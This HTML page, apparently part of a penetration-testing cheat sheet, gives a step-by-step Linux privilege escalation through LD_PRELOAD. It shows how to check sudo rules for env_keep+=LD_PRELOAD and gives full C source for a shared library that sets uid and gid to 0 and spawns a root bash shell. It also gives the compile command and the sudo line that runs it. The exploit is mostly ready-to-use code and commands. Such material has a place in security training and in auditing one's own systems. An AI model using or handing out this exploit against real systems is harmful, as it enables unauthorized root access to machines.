<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <title>Local_Priv_Esc_Linux - LD_PRELOAD</title>
        <style>
body {
    background-color: #0c0c0c;
    color: #d0d0d0;
    font-family: "Courier New", Courier, monospace;
    margin: 40px;
}

      h1,
      h2 {
          color: #009e66;
          text-shadow: 0 0 8px #004d33;
      }

      a {
          color: #3399cc;
          text-decoration: none;
      }

      a:hover {
          color: #00ccff;
          text-shadow: 0 0 6px #00ccff;
      }

      code,
      pre,
      blockquote {
          background-color: #111;
          padding: 10px;
          border-radius: 6px;
          display: block;
          color: #ccc;
          overflow-x: auto;
      }

      ul {
          list-style: square;
          padding-left: 20px;
      }

      li {
          margin-top: 15;
      }

      em {
          color: #aaa;
      }

      hr {
          border: none;
          height: 1px;
          background-color: #333;
          margin: 20px 0;
      }

      .section {
          margin-bottom: 40px;
      }

      .flag {
          background-color: #222;
          border: 1px dashed #009e66;
          padding: 10px;
          margin-top: 10px;
          font-weight: bold;
      }

      .back-button {
          position: fixed;
          background-color: #009e66;
          color: #fff;
          padding: 10px 16px;
          border-radius: 6px;
          text-decoration: none;
          font-weight: bold;
          box-shadow: 0 0 10px #004d33;
          transition: background-color 0.3s;
          z-index: 1000;
      }

      .back-button:hover {
          background-color: #00cc99;
      }

      .back-top {
          top: 20px;
          right: 20px;
      }

        </style>
    </head>
    <body>
        <h1>Local_Priv_Esc_Linux - LD_PRELOAD</h1>
        <p>
        A quite explaination with PoC covering <strong>LD_PRELOAD</strong> exploitation.
        </p>

        <a href="https://hx3r.github.io/CheatBook/" class="back-button back-top">⬅️ Back to CheatBook</a>

        <div class="section">
            <h2>1️⃣  Requirements</h2>
            <ul>
                <li>
                    <p>Linux distribution</p>
                    <p>user with sudo privileges (no system-wide access just one simple command is enough)</p>
                    <pre><code>sudo -l  // check allowed sudo commands 

Matching Defaults entries for {{user}} on {{host}}:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User {{use}} may run the following commands on {{host}}:
    (root) NOPASSWD: /usr/sbin/apache2 restart</code></pre>
                </li>
                <li>
                    <p>LD_PRELOAD must be preserved by sudo.
                    <code>env_keep+=LD_PRELOAD</code> must be set in sudoers</p>
                </li>
                <li>
                    <p>gcc is installed (c compiler to compile the evil lib)</p>
                </li>
            </ul>
        </div>

        <div class="section">
            <h2>2️⃣  Preparation</h2>
            <ul>
                <li>
                    <p>create a .c file with following content</p>
                    <code>#include <stdio.h>
                        #include <sys/types.h>
                        #include <stdlib.h>
                        #include <unistd.h>

                        void _init() {
                        unsetenv("LD_PRELOAD");
                        setgid(0);
                        setuid(0);
                        system("/bin/bash");
                        }
                    </code>
                    <li>
                        <p>compiling the preloadable .so file</p>
                        <code> gcc -fPIC -shared -o priv_esc.so priv_esc.c -nostartfiles </code>
                        <code><ul><p>explaining the command<p>
                                <li>gcc = C compiler</li>
                                <li>-fPIC = Generate position-independent code</li>
                                <li>-shared = Create a shared library (.so)</li>
                                <li>-o priv_esc.so = Output file name</li>
                                <li>priv_esc.c = Sorce file</li>
                                <li>-nostartfiles = skip startup files (lightweight)</li>
                            </ul>
                        </code>
                        <h2>3️⃣  Execution</h2>
                        <ul>
                            <li>
                                <p>execute the sudo command with the preloaded .so file</p>
                                <code>
                                    sudo LD_PRELOAD=priv_esc.so /usr/sbin/apache2 restart
                                </code>
                            </li>
                        </ul>
                        <div class="flag">Root Priv: <code>uid=0(root) gid=0(root) groups=0(root)</code></div>
        </div>

        <hr />

        <p>
        <strong>Discord:</strong>
        <a href="https://discord.gg/whe72edd" target="_blank">Join my server</a>
        </p>
    </body>
</html>
